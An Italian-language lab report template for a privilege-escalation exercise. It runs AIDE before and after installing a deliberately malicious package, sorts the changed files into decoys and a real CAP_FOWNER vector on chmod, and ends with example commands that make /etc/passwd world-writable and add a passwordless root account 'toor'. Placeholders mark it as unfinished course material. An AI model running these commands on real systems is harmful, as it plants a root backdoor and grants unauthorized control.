REPORT PRIVILEGE ESCALATION

1. INTEGRITY CHECK (AIDE)
Inizio facendo l'Integrity Check con AIDE per vedere cosa cambia quando installo il pacchetto malevolo.

Modifico il file /etc/aide/aide.conf:
- Ho commentato la seguente riga per evitare l'inclusione di controlli automatici (per questioni di tempo):
  # @@x_include /etc/aide/aide.conf.d ^[a-zA-Z0-9_-]+$
- In fondo al file ho aggiunto queste righe per monitorare le directory (e i file in esse contenuti) che il pacchetto andrà a modificare:
  [/DIR/NUMERO/1]  f  Full
  [/DIR/NUMERO/2]    f  Full

Creo il database relativo al sistema integro prima dell'infezione:
  $ sudo aide -c /etc/aide/aide.conf -i

Copio il file per attivarlo:
  $ sudo cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db

Estraggo e installo il pacchetto malevolo:
  $ gunzip [NOME_PACCHETTO].deb.gz
  $ sudo dpkg -i [NOME_PACCHETTO].deb

Lancio l'integrity check vero e proprio:
  $ sudo aide -c /etc/aide/aide.conf -C

[INSERIRE SCREENSHOT TERMINALE AIDE]


2. ANALISI OUTPUT
AIDE ha rilevato:
- Added entries:   [NUMERO]
- Removed entries: [NUMERO]
- Changed entries: [NUMERO]

Gli elementi rimossi non hanno abilitato alcuna possibile vulnerabilità.

Questi file sono stati modificati ma non sono utili per l'attacco:
- [FILE 1]
- [FILE 2]

Questi invece hanno delle modifiche potenzialmente significative:
[FILE 3]
[PARTE RILEVANTE DEL CHECK DI AIDE]

[FILE 4]
[PARTE RILEVANTE DEL CHECK DI AIDE]

Per quanto riguarda le entità aggiunte:
[DIREI CHE DOBBIAMO ANDARE A FARE A MANO getcaps, getfacl, ls -l ECC PER CAPIRE L'UTILITÀ. SPESSO SARÀ TIPO UN FILE SUDOERS PER ESEMPIO]


3. ANALISI VETTORI
Analizzo ora i file che hanno subito modifiche a permessi, SUID o capabilities [E GLI EVENTUALI ELEMENTI AGGIUNTI].

-------------------------- ESEMPIO
Target: /usr/bin/yes
- Rilevato: Modifica permessi (SUID attivo).
- Investigazione: Ho fatto `ls -l /usr/bin/yes`. C'è il SUID di root.
- Conclusione: Il comando non permette di eseguire shell escaping né di leggere/scrivere file. È un falso positivo/distrattore.
[INSERIRE SCREENSHOT: ls -l /usr/bin/yes]

Target: /usr/bin/sort
- Rilevato: Modifica capabilities.
- Investigazione: Ho fatto `getcap /usr/bin/sort`. Trovo la capability CAP_MKNOD.
- Conclusione: La capability permette di creare device file, ma il comando sort non la utilizza nel suo codice. Falso positivo/distrattore.
[INSERIRE SCREENSHOT: getcap /usr/bin/sort]

Target: /etc/shadow
- Rilevato: Modifica ACL.
- Investigazione: Ho fatto `getfacl /etc/shadow`. L'utente 'first' ha i permessi di lettura.
- Conclusione: Inutile a meno che io non abbia già accesso a quell'utente. Distrattore.
[INSERIRE SCREENSHOT: getfacl /etc/shadow]

Target: /usr/bin/chmod (VETTORE CRITICO)
- Rilevato: Modifica capabilities e GID.
- Investigazione: Ho fatto `getcap /usr/bin/chmod`. Trovo la capability CAP_FOWNER.
- Conclusione: Questa capability mi permette di usare chmod su qualsiasi file scavalcando il proprietario. È il vettore d'attacco.
[INSERIRE SCREENSHOT: getcap /usr/bin/chmod]
---------------------------

4. ESECUZIONE EXPLOIT

-------------------------- ESEMPIO
Sfrutto la capability su chmod per rendere /etc/passwd scrivibile a tutti:
  $ chmod 666 /etc/passwd

Aggiungo una riga al file passwd per creare un nuovo utente root ('toor') senza password:
  $ echo 'toor::0:0:root:/root:/bin/bash' >> /etc/passwd

Faccio login col nuovo utente per ottenere la shell di root:
  $ su toor

Verifico di essere root:
  $ id
[INSERIRE SCREENSHOT: output comando id]
-------------------------
